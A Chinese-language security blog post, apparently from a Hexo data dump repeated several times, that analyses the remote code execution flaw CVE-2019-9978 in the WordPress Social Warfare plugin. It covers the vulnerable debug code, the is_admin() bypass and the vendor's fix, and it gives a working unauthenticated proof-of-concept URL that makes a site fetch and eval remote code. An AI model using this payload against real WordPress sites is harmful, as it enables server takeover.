第3行将WP_ADMIN定义为true\n\n也就是说，is_admin方法，检查的是：此时运行时常量WP_ADMIN的值是否为true。\n\n在wordpress中，WP_ADMIN只是用来标识该文件是否为后台文件。大多数后台文件，都会在脚本中定义WP_ADMIN为true(例如wp-admin目录下的admin-post.php等)， 因此is_admin方法检测通过时，只能说明此是通过后台文件作为入口，调用debug_parameters方法，并不能有效的验证此时访问者的身份是否是admin\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/33f902eec67376c6d25e3d0dd6a9fb5f.png)\n\n前台index.php无法触发\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f4c0cca46dd5d5fc3b030c0551588024.png)\n\nwp-admin目录下的about.php可以触发\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/2cc7e92daa9871394958530b342e44df.png)\n\n可见，wp-admin下任意文件为入口，都可以触发该漏洞，也就是说，在构造payload以及进行防护时，需要注意\n\nhttp://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\n\n这里xxx可以是绝大多数后台php文件\n\n### 思考二：\n\n访问http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options 时，是如何将get请求中的swp_debug=get_user_options与get_user_options功能模块关联起来，调用此功能模块执行相应的功能呢？\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/c63a5db2ef1357c6fb1c0c176eb5195f.png)\n\n同理，当访问http://127.0.0.1/wordpress/index.php?swp_debug=load_options 时，后台是如何解析get请求，并找到load_options模块的？\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9d224e3ea0e9aff4641c2f37250366e1.png)\n\n开始的时候，笔者以为是有相关的路由配置(类似于django中的url解析)，或者说是类似MVC结构中的控制器（类似thinkphp中的url普通模式http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value）这样的结构，但实际真相很简单：\n\n见下图，SWP_Utility::debug方法\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/d8e014b47e8d8c511fb6f6ef359efe43.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f416a39a73e5de93a96b836bf844b57a.png)\n\n在debug_parameters方法中的所有if分支中逐个执行debug方法，逐个将debug方法内注册的值（’load_options’、’get_user_options’等）和get请求中swp_debug的值进行比较，如果一样，则执行该功能模块的代码，如果不一样，则进入下个if中。道理同等于switch\n","slug":"WordPress-Social-Warfare-Rce","published":1,"updated":"2020-10-27T09:25:30.046Z","_id":"ckgrozu8v001xwsa920bpbdf3","comments":1,"layout":"post","photos":[],"link":"","content":"<hr>\n<div align=\"center\"></div>\n\n<p>social-warfare是一款 WordPress社交分享按钮插件。 该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量</p>\n<p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞</p>\n<a id=\"more\"></a>\n\n<h1 id=\"背景介绍\"><a href=\"#背景介绍\" class=\"headerlink\" title=\"背景介绍\"></a>背景介绍</h1><p>social-warfare是一款 WordPress社交分享按钮插件。 不同于大多数WordPress社交分享插件，social-warfar最大的优势在于其轻便性与高效性。它不会像其他共享插件一样减慢网站速度，这也是很多用户使用其作为自己网站社交分享插件的原因。</p>\n<p>该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9cab96ac7dc5a8c199faa4cea800d35b.png\"></p>\n<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。</p>\n<p>攻击成功的条件只需要如下两条：</p>\n<p>只要符合以上两个条件，无需复杂的payload构造，即可通过简简单单的一个get请求，远程执行任意代码。<br>与wordpress自身漏洞修补不同，对于插件的漏洞，wordpress并不会在后台对该插件进行自动升级，仅仅是提示有新版本可用。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f09cfb9a4bf7ca3a89624bbdab4ece3a.png\"></p>\n<p>简言之，由于该机制的存在，目前还有大部分使用该插件的站长，所使用着仍存在漏洞版本的social-warfare插件，面临着被攻击的风险。</p>\n<p>与此同时，这个漏洞，还是一个洞中洞，开发者的一连串失误，将该漏洞威胁等级逐步增高。</p>\n<p>&nbsp;</p>\n<h2 id=\"受影响的系统版本\"><a href=\"#受影响的系统版本\" class=\"headerlink\" title=\"受影响的系统版本\"></a>受影响的系统版本</h2><p>social-warfare&lt;= 3.5.2</p>\n<p>&nbsp;</p>\n<h2 id=\"漏洞编号\"><a href=\"#漏洞编号\" class=\"headerlink\" title=\"漏洞编号\"></a>漏洞编号</h2><p>CVE-2019-9978</p>\n<p>&nbsp;</p>\n<h1 id=\"漏洞细节\"><a href=\"#漏洞细节\" class=\"headerlink\" title=\"漏洞细节\"></a>漏洞细节</h1><p>social-warfare安装后如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/6cea63341fcc7d1afae9189460553fb4.png\"></p>\n<p>如图中红框所见，该插件提供了一个简洁易用的分享功能栏。</p>\n<p>首先，通过github的commit记录，找到漏洞触发点</p>\n<p>漏洞触发点位于/wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php中的debug_parameters方法中</p>\n<p>首先分析下debug_parameters方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a7ba07b0bc7379abc39d0dc734bef4d.png\"></p>\n<p>该方法提供了一种允许更容易调试数据库迁移功能的方法。</p>\n<p>先来看下get_user_options功能的代码块</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/4e04fc9b7265e54c0e15a3635fc5874b.png\"></p>\n<p>此处功能模块加载wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php 中initialize_database方法中的$defaults数组中的配置信息，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/19b94966c0e303f8164286461e0338e2.png\"></p>\n<p>在访问与执行该功能模块后，返回相应的配置信息</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/fcd76e490cc82b1d1ca222c7fc4727b7.png\"></p>\n<p>接下来分析漏洞触发点 位于如下图中的if分支中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/34a240e81557704f1c9745d6080e23ad.png\"></p>\n<p>也就是在’load_options’这个功能模块中。该功能模块，是开发者用来调试数据库迁移功能的，在对用户实现实际的业务功能中，该模块并没有被使用过。</p>\n<p>逐行分析下此功能模块 首先，可以看到如下图代码块:</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png\"></p>\n<p>如红框中所见，这里的代码看起来，需要通过is_admin()方法的校验。看起来，这里需要有admin权限才可以执行后续代码触发漏洞。按照以往经验，这是一个需要后台权限才可以代码执行的漏洞（但这里的推测并不正确，具体的见下文分析）</p>\n<p>紧接着，通过file_get_contents方法，发送请求</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/17cbe28ee96c48c8baab35742002bf3d.png\"></p>\n<p>其中的$_GET[‘swp_url’]我们可控，例如：</p>\n<p><a href=\"http://127.0.0.0/\">http://127.0.0</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0594cb2ffa6f8a291c0ba8d41e1e5668.png\"></p>\n<p>这样file_get_contents会访问 <a href=\"http://127.0.0.1/1.php?swp_debug=get_user_options%EF%BC%8C%E5%B9%B6%E5%B0%86%E6%88%91%E4%BB%AC%E6%9E%84%E9%80%A0%E5%A5%BD%E7%9A%84payload%E4%BC%A0%E9%80%92%E7%BB%99$options%E5%8F%98%E9%87%8F\">http://127.0.0.1/1.php?swp_debug=get_user_options，并将我们构造好的payload传递给$options变量</a> 到此为止，我们通过构造链接传入file_get_contents，达到完全可控$options变量中的内容的目的</p>\n<p>接下来，会从$options变量中提取出内容，并进行解析，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/bded25e5da4ccfa0f16d614b52548839.png\"></p>\n<p>随后，将解析出的$options值拼接后赋予$array，如使用我们案例中的1.php,那么$array的值为：return phpinfo()</p>\n<p>接下来，$array中的值会传递入eval中，造成代码执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/dd061c81db5e40245e4458ff5f8bc8ba.png\"></p>\n<p>实际效果如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/66a4b42781354e24b2cde9e630f51bb1.png\"></p>\n<p>漏洞分析到此结束，本次漏洞影响很大，但漏洞自身没有什么亮点</p>\n<p>接下来，看一下官方是如何修补的：</p>\n<p>通过github的commit记录，获取此次的修补方案。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/a134e944bfa46ae34edb4d687d33f597.png\"></p>\n<p>此次修补，将lib/utilities/SWP_Database_Migration.php中的221-284行，将debug_parameters方法中存在问题的load_options模块代码全部删除 所以不存在绕过补丁的可能性。</p>\n<p>在分析此漏洞时，有几处有意思的地方，和大家分享一下：</p>\n<h3 id=\"思考一：\"><a href=\"#思考一：\" class=\"headerlink\" title=\"思考一：\"></a>思考一：</h3><p>先来看下如下操作：</p>\n<p>首先，我们退出wordpress登陆</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0dba144a1bc952bc4cda36f0cce39b6c.png\"></p>\n<p>可见，此时我们并没有登陆，也没有admin权限</p>\n<p>接着，我们访问poc</p>\n<p><a href=\"http://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\">http://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/650252922e64b757e1d7c89b063cc305.png\"></p>\n<p>payload仍然可以触发</p>\n<p>回顾上文此处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png\"></p>\n<p>在漏洞分析环节，我们的猜测是，由于is_admin方法的校验，此处应该是后台漏洞，但是在没有登陆的情况下，仍然触发了。</p>\n<p>这是为什么呢？</p>\n<p>原因如下： 先来看看is_admin方法是如何实现的</p>\n<p>位于/wp-includes/load.php中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/de06cb5281ce8f86eff50fab3c185a22.png\"></p>\n<p>可以看到，有一个if-elseif判断</p>\n<p>在elseif中判断defined (‘WP_ADMIN’)的值</p>\n<p>由于我们构造的payload，入口是admin-post.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0fed2e5c53e4edde5b9d93f2048793d6.png\"></p>\n<p>看一下admin-post.php 第3行将WP_ADMIN定义为true</p>\n<p>也就是说，is_admin方法，检查的是：此时运行时常量WP_ADMIN的值是否为true。</p>\n<p>在wordpress中，WP_ADMIN只是用来标识该文件是否为后台文件。大多数后台文件，都会在脚本中定义WP_ADMIN为true(例如wp-admin目录下的admin-post.php等)， 因此is_admin方法检测通过时，只能说明此是通过后台文件作为入口，调用debug_parameters方法，并不能有效的验证此时访问者的身份是否是admin</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/33f902eec67376c6d25e3d0dd6a9fb5f.png\"></p>\n<p>前台index.php无法触发</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f4c0cca46dd5d5fc3b030c0551588024.png\"></p>\n<p>wp-admin目录下的about.php可以触发</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/2cc7e92daa9871394958530b342e44df.png\"></p>\n<p>可见，wp-admin下任意文件为入口，都可以触发该漏洞，也就是说，在构造payload以及进行防护时，需要注意</p>\n<p><a href=\"http://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\">http://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php</a></p>\n<p>这里xxx可以是绝大多数后台php文件</p>\n<h3 id=\"思考二：\"><a href=\"#思考二：\" class=\"headerlink\" title=\"思考二：\"></a>思考二：</h3><p>访问<a href=\"http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options\">http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options</a> 时，是如何将get请求中的swp_debug=get_user_options与get_user_options功能模块关联起来，调用此功能模块执行相应的功能呢？</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/c63a5db2ef1357c6fb1c0c176eb5195f.png\"></p>\n<p>同理，当访问<a href=\"http://127.0.0.1/wordpress/index.php?swp_debug=load_options\">http://127.0.0.1/wordpress/index.php?swp_debug=load_options</a> 时，后台是如何解析get请求，并找到load_options模块的？</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9d224e3ea0e9aff4641c2f37250366e1.png\"></p>\n<p>开始的时候，笔者以为是有相关的路由配置(类似于django中的url解析)，或者说是类似MVC结构中的控制器（类似thinkphp中的url普通模式<a href=\"http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value%EF%BC%89%E8%BF%99%E6%A0%B7%E7%9A%84%E7%BB%93%E6%9E%84%EF%BC%8C%E4%BD%86%E5%AE%9E%E9%99%85%E7%9C%9F%E7%9B%B8%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%9A\">http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value）这样的结构，但实际真相很简单：</a></p>\n<p>见下图，SWP_Utility::debug方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/d8e014b47e8d8c511fb6f6ef359efe43.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f416a39a73e5de93a96b836bf844b57a.png\"></p>\n<p>在debug_parameters方法中的所有if分支中逐个执行debug方法，逐个将debug方法内注册的值（’load_options’、’get_user_options’等）和get请求中swp_debug的值进行比较，如果一样，则执行该功能模块的代码，如果不一样，则进入下个if中。道理同等于switch</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/机器学习算法2.jpg","excerpt":"<hr>\n<div align=\"center\"></div>\n\n<p>social-warfare是一款 WordPress社交分享按钮插件。 该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量</p>\n<p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞</p>","more":"<h1 id=\"背景介绍\"><a href=\"#背景介绍\" class=\"headerlink\" title=\"背景介绍\"></a>背景介绍</h1><p>social-warfare是一款 WordPress社交分享按钮插件。 不同于大多数WordPress社交分享插件，social-warfar最大的优势在于其轻便性与高效性。它不会像其他共享插件一样减慢网站速度，这也是很多用户使用其作为自己网站社交分享插件的原因。</p>\n<p>该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9cab96ac7dc5a8c199faa4cea800d35b.png\"></p>\n<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。</p>\n<p>攻击成功的条件只需要如下两条：</p>\n<p>只要符合以上两个条件，无需复杂的payload构造，即可通过简简单单的一个get请求，远程执行任意代码。<br>与wordpress自身漏洞修补不同，对于插件的漏洞，wordpress并不会在后台对该插件进行自动升级，仅仅是提示有新版本可用。</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f09cfb9a4bf7ca3a89624bbdab4ece3a.png\"></p>\n<p>简言之，由于该机制的存在，目前还有大部分使用该插件的站长，所使用着仍存在漏洞版本的social-warfare插件，面临着被攻击的风险。</p>\n<p>与此同时，这个漏洞，还是一个洞中洞，开发者的一连串失误，将该漏洞威胁等级逐步增高。</p>\n<p>&nbsp;</p>\n<h2 id=\"受影响的系统版本\"><a href=\"#受影响的系统版本\" class=\"headerlink\" title=\"受影响的系统版本\"></a>受影响的系统版本</h2><p>social-warfare&lt;= 3.5.2</p>\n<p>&nbsp;</p>\n<h2 id=\"漏洞编号\"><a href=\"#漏洞编号\" class=\"headerlink\" title=\"漏洞编号\"></a>漏洞编号</h2><p>CVE-2019-9978</p>\n<p>&nbsp;</p>\n<h1 id=\"漏洞细节\"><a href=\"#漏洞细节\" class=\"headerlink\" title=\"漏洞细节\"></a>漏洞细节</h1><p>social-warfare安装后如下图</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/6cea63341fcc7d1afae9189460553fb4.png\"></p>\n<p>如图中红框所见，该插件提供了一个简洁易用的分享功能栏。</p>\n<p>首先，通过github的commit记录，找到漏洞触发点</p>\n<p>漏洞触发点位于/wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php中的debug_parameters方法中</p>\n<p>首先分析下debug_parameters方法</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a7ba07b0bc7379abc39d0dc734bef4d.png\"></p>\n<p>该方法提供了一种允许更容易调试数据库迁移功能的方法。</p>\n<p>先来看下get_user_options功能的代码块</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/4e04fc9b7265e54c0e15a3635fc5874b.png\"></p>\n<p>此处功能模块加载wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php 中initialize_database方法中的$defaults数组中的配置信息，如下图</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/19b94966c0e303f8164286461e0338e2.png\"></p>\n<p>在访问与执行该功能模块后，返回相应的配置信息</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/fcd76e490cc82b1d1ca222c7fc4727b7.png\"></p>\n<p>接下来分析漏洞触发点 位于如下图中的if分支中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/34a240e81557704f1c9745d6080e23ad.png\"></p>\n<p>也就是在’load_options’这个功能模块中。该功能模块，是开发者用来调试数据库迁移功能的，在对用户实现实际的业务功能中，该模块并没有被使用过。</p>\n<p>逐行分析下此功能模块 首先，可以看到如下图代码块:</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png\"></p>\n<p>如红框中所见，这里的代码看起来，需要通过is_admin()方法的校验。看起来，这里需要有admin权限才可以执行后续代码触发漏洞。按照以往经验，这是一个需要后台权限才可以代码执行的漏洞（但这里的推测并不正确，具体的见下文分析）</p>\n<p>紧接着，通过file_get_contents方法，发送请求</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/17cbe28ee96c48c8baab35742002bf3d.png\"></p>\n<p>其中的$_GET[‘swp_url’]我们可控，例如：</p>\n<p><a href=\"http://127.0.0.0/\">http://127.0.0</a></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0594cb2ffa6f8a291c0ba8d41e1e5668.png\"></p>\n<p>这样file_get_contents会访问 <a href=\"http://127.0.0.1/1.php?swp_debug=get_user_options%EF%BC%8C%E5%B9%B6%E5%B0%86%E6%88%91%E4%BB%AC%E6%9E%84%E9%80%A0%E5%A5%BD%E7%9A%84payload%E4%BC%A0%E9%80%92%E7%BB%99$options%E5%8F%98%E9%87%8F\">http://127.0.0.1/1.php?swp_debug=get_user_options，并将我们构造好的payload传递给$options变量</a> 到此为止，我们通过构造链接传入file_get_contents，达到完全可控$options变量中的内容的目的</p>\n<p>接下来，会从$options变量中提取出内容，并进行解析，如下图</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/bded25e5da4ccfa0f16d614b52548839.png\"></p>\n<p>随后，将解析出的$options值拼接后赋予$array，如使用我们案例中的1.php,那么$array的值为：return phpinfo()</p>\n<p>接下来，$array中的值会传递入eval中，造成代码执行</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/dd061c81db5e40245e4458ff5f8bc8ba.png\"></p>\n<p>实际效果如下图</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/66a4b42781354e24b2cde9e630f51bb1.png\"></p>\n<p>漏洞分析到此结束，本次漏洞影响很大，但漏洞自身没有什么亮点</p>\n<p>接下来，看一下官方是如何修补的：</p>\n<p>通过github的commit记录，获取此次的修补方案。</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/a134e944bfa46ae34edb4d687d33f597.png\"></p>\n<p>此次修补，将lib/utilities/SWP_Database_Migration.php中的221-284行，将debug_parameters方法中存在问题的load_options模块代码全部删除 所以不存在绕过补丁的可能性。</p>\n<p>在分析此漏洞时，有几处有意思的地方，和大家分享一下：</p>\n<h3 id=\"思考一：\"><a href=\"#思考一：\" class=\"headerlink\" title=\"思考一：\"></a>思考一：</h3><p>先来看下如下操作：</p>\n<p>首先，我们退出wordpress登陆</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0dba144a1bc952bc4cda36f0cce39b6c.png\"></p>\n<p>可见，此时我们并没有登陆，也没有admin权限</p>\n<p>接着，我们访问poc</p>\n<p><a href=\"http://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\">http://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php</a></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/650252922e64b757e1d7c89b063cc305.png\"></p>\n<p>payload仍然可以触发</p>\n<p>回顾上文此处</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png\"></p>\n<p>在漏洞分析环节，我们的猜测是，由于is_admin方法的校验，此处应该是后台漏洞，但是在没有登陆的情况下，仍然触发了。</p>\n<p>这是为什么呢？</p>\n<p>原因如下： 先来看看is_admin方法是如何实现的</p>\n<p>位于/wp-includes/load.php中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/de06cb5281ce8f86eff50fab3c185a22.png\"></p>\n<p>可以看到，有一个if-elseif判断</p>\n<p>在elseif中判断defined (‘WP_ADMIN’)的值</p>\n<p>由于我们构造的payload，入口是admin-post.php</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0fed2e5c53e4edde5b9d93f2048793d6.png\"></p>\n<p>看一下admin-post.php 第3行将WP_ADMIN定义为true</p>\n<p>也就是说，is_admin方法，检查的是：此时运行时常量WP_ADMIN的值是否为true。</p>\n<p>在wordpress中，WP_ADMIN只是用来标识该文件是否为后台文件。大多数后台文件，都会在脚本中定义WP_ADMIN为true(例如wp-admin目录下的admin-post.php等)， 因此is_admin方法检测通过时，只能说明此是通过后台文件作为入口，调用debug_parameters方法，并不能有效的验证此时访问者的身份是否是admin</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/33f902eec67376c6d25e3d0dd6a9fb5f.png\"></p>\n<p>前台index.php无法触发</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f4c0cca46dd5d5fc3b030c0551588024.png\"></p>\n<p>wp-admin目录下的about.php可以触发</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/2cc7e92daa9871394958530b342e44df.png\"></p>\n<p>可见，wp-admin下任意文件为入口，都可以触发该漏洞，也就是说，在构造payload以及进行防护时，需要注意</p>\n<p><a href=\"http://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\">http://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php</a></p>\n<p>这里xxx可以是绝大多数后台php文件</p>\n<h3 id=\"思考二：\"><a href=\"#思考二：\" class=\"headerlink\" title=\"思考二：\"></a>思考二：</h3><p>访问<a href=\"http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options\">http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options</a> 时，是如何将get请求中的swp_debug=get_user_options与get_user_options功能模块关联起来，调用此功能模块执行相应的功能呢？</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/c63a5db2ef1357c6fb1c0c176eb5195f.png\"></p>\n<p>同理，当访问<a href=\"http://127.0.0.1/wordpress/index.php?swp_debug=load_options\">http://127.0.0.1/wordpress/index.php?swp_debug=load_options</a> 时，后台是如何解析get请求，并找到load_options模块的？</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9d224e3ea0e9aff4641c2f37250366e1.png\"></p>\n<p>开始的时候，笔者以为是有相关的路由配置(类似于django中的url解析)，或者说是类似MVC结构中的控制器（类似thinkphp中的url普通模式<a href=\"http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value%EF%BC%89%E8%BF%99%E6%A0%B7%E7%9A%84%E7%BB%93%E6%9E%84%EF%BC%8C%E4%BD%86%E5%AE%9E%E9%99%85%E7%9C%9F%E7%9B%B8%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%9A\">http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value）这样的结构，但实际真相很简单：</a></p>\n<p>见下图，SWP_Utility::debug方法</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/d8e014b47e8d8c511fb6f6ef359efe43.png\"></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f416a39a73e5de93a96b836bf844b57a.png\"></p>\n<p>在debug_parameters方法中的所有if分支中逐个执行debug方法，逐个将debug方法内注册的值（’load_options’、’get_user_options’等）和get请求中swp_debug的值进行比较，如果一样，则执行该功能模块的代码，如果不一样，则进入下个if中。道理同等于switch</p>"},{"title":"WordPress Ninja Forms插件 CSRF to XSS漏洞（CVE-2020-12462）分析","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/4a44e04be50baddb294deb2987f7180.jpg","date":"2020-05-25T09:26:34.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n前言\n----\n\nNinja Forms是一款WordPress插件。使用Ninja Forms插件无需编码即可以创建美观、用户友好的WordPress表单。据统计，全球超过 2,000,000 个网站正在使用 Ninja 